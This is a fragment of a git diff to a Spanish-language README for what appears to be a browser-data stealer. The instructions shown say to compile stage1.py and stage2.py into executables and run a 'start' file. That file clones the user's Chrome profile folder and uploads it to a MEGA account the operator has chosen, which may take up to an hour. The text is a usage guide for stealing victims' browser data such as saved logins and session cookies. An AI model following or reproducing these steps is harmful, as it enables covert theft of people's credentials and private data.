@@ -12,4 +12,4 @@ Por ultimo tienes que pasar a .exe el archivo stage1.py y el stage2.py, despues 
 
 -Eso seria todo solamente tienes que ejecutar el archivo "start" y comenzara todo el proceso de clonación de la carpeta del usuario de chrome y te llegara a la dirección de mega que asignaste.
 
-<El proceso puede tardar hasta una hora en enviarse>
+"El proceso puede tardar hasta una hora en enviarse"
